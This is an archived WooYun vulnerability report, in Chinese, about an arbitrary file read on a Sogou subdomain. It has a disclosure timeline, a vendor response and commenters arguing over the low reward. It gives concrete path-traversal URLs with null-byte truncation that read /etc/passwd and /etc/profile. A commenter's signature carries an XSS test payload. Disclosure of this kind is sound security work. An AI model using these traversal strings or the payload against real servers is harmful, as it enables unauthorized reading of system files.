{"id": 2627, "wybug_id": "wooyun-2014-064730", "wybug_title": "搜狗某站点任意文件读取(2)", "wybug_corp": "搜狗", "wybug_author": "梧桐雨", "wybug_date": "2014-06-12 23:52", "wybug_open_date": "2014-07-27 23:54", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "任意文件读取", "文件操作参数未加过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-27：\t细节向公众公开  简要描述： 还是两天前的站点。你们做了修补，蘑菇总是长一片啊同样问题不会只有一个。修补千万不能指哪修哪，还得全面评估才是。前面2个漏洞都修补了，为什么不确认呢？好吧，再来一个给你们提醒提醒。 详细说明：  在案例：http://wooyun.org/bugs/wooyun-2010-064342中，你们确实已经对path进行了限制。如今访问会空白，如下图：\n\n好了，看样子这个点暂时没有了。通过对目录的遍历以及一些页面的扫描，结合fuzz之后。得到了head.html也有调用的成分。但是这次没有上次那么完整，需要配合%00截断如图：\n\nhttp://ie.sogou.com/user/head.html?size=../../../../../../../../../etc/passwd%00.jpg   漏洞证明：  再读：http://ie.sogou.com/user/head.html?size=../../../../../../../../../etc/profile%00.jpg\n\n   修复方案：  嗯。。应该知道怎么修了，这次千万不要在只修一个地方了。看看代码还有哪些地方有类似调用的，fix掉吧。   版权声明：转载请注明来源 梧桐雨@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2014-06-17 11:11 厂商回复： 欢迎到SGSRC提交漏洞，感谢支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n          这些评论似乎很乌云~~~思密达          2014-06-17 11:43 |\t\t\t\t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t\t\t\tRank:1576 漏洞数:184\t\t\t| 关注技术与网络安全)\t\t\t\t\t\t\t\n  无论如何我都想不明白了，一个任意文件读取能读你们服务器上的东西，怎么就只值3分，如果你们永远把白帽子当成乞讨者去看待，你们的安全永远不可能做得好！    \n   \n \n     2014-06-13 14:54 |    \t\tYouYaX(乌云厂商)\t\t \n  看似大厂商，其实里面的程序员也是很初级的。    \n     2014-06-13 15:17 |    \t\t平仔 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 混迹在电商的网络营销人。)\t\t \n  @YouYaX 这位说到实处了！大厂商里面有初级程序猿的！    \n     2014-06-15 13:37 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  如果再说这个是SGSRC有人提交了，也是我先提交的，再忽略简直就是胡扯！    \n     2014-06-15 13:38 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  PS 是在乌云先提交，而不是在SGSRC。    \n     2014-06-17 11:34 |    \t\tzj1244 \t\t\t( 普通白帽子  |\t\t\t        Rank:273 漏洞数:33        | 小葵)\t\t \n  @YouYaX 厂商何苦为难厂商( >﹏<。)    \n     2014-06-17 11:39 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  3分。。。这就是你们对白帽子的态度    \n     2014-06-17 11:43 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  无论如何我都想不明白了，一个任意文件读取能读你们服务器上的东西，怎么就只值3分，如果你们永远把白帽子当成乞讨者去看待，你们的安全永远不可能做得好！    \n     2014-06-17 11:50 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @梧桐雨 = = 我觉得吧，他们这是在告诉你：“让你在乌云提交，我给你3分！看你还在乌云提交不！”    \n     2014-06-17 12:11 |    \t\tzj1244 \t\t\t( 普通白帽子  |\t\t\t        Rank:273 漏洞数:33        | 小葵)\t\t \n  @gainover g牛总是如此犀利    \n     2014-06-17 12:15 |    \t\tclown岩 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:13        | 哎呀 谁的肥皂？ 各位大牛多多关照！陪聊 ...)\t\t \n  @gainover 不叫事 任意文件读取在SGSRC也就给4分    \n     2014-06-17 12:45 |    \t\tzcy \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  @clown岩 4分？想多了吧。。。    \n     2014-06-17 13:39 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  这还支持个毛啊    \n     2014-06-17 16:52 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @梧桐雨 他们的回复就是叫你去他们的SGSRC提交呗。    \n     2014-07-07 11:25 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  @niliu @寂寞的瘦子 @gainover @梧桐雨 建议乌云评估一个rank值给厂商参考，厂商给的rank值决定公开的时间。比如乌云评估10，厂商给2，那就不要10天、10天的等待着公开了，直接2天、2天来吧。按百分比决定公开时间，反正他们也不重视。 你们觉得呢？    \n     2014-07-28 09:35 |    \t\txyang \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:51        | stay hungry stay foolish)\t\t \n  二哥说的对    \n     2014-07-28 10:03 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  mark一下，厂商真该格盘    \n     2014-07-28 14:25 |    \t\tkeke \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:8        | 目测和口算各种妹纸)\t\t \n  @梧桐雨 你这么低级的测试 还美名叫FUZZ?    \n     2014-07-28 15:12 |    \t\tdante \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | http://zhu.zhu.kr)\t\t \n  有本事别提交啊，笨    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}